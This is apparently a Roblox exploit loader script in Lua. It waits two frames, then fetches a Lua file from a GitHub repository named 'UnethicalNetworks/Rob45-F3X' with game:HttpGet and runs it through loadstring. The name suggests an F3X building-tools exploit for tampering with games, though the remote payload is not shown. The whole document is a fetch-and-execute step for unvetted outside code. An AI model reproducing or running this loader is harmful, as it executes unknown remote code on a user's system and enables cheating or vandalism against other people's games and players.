local RanTimes = 0

local Connection = game:GetService("RunService").Heartbeat:Connect(function()
    RanTimes += 1
end)

repeat
    task.wait()
until RanTimes >= 2

Connection:Disconnect()

loadstring(game:HttpGet("https://github.com/UnethicalNetworks/Rob45-F3X/blob/7ab15c039cf15e6775e49d9b0148f706075449d0/F3X.Lua"))()